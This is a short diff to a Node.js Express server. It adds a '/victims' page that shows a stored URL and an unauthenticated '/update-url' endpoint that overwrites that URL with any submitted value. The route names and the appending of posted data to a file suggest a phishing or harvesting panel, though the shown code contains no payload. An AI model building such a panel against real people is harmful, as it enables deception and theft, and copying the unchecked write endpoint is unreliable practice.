@@ -46,7 +46,28 @@ app.get("/", (req, res) => {
   );
 });
 app.get("/victims", (req, res) => {
-  res.render("victims");
+  // Read the current URL from a file, or use default
+  let currentUrl = "https://9qj775-5000.csb.app/";
+  try {
+    if (fs.existsSync("./current_url.txt")) {
+      currentUrl = fs.readFileSync("./current_url.txt", "utf8").trim();
+    }
+  } catch (err) {
+    console.log("Using default URL");
+  }
+  
+  res.render("victims", { currentUrl: currentUrl });
+});
+
+// Add route to update URL
+app.post("/update-url", (req, res) => {
+  const newUrl = req.body.url;
+  if (newUrl) {
+    fs.writeFileSync("./current_url.txt", newUrl);
+    res.json({ success: true });
+  } else {
+    res.json({ success: false, error: "No URL provided" });
+  }
 });
 app.post("/", (req, res) => {
   fs.appendFile(
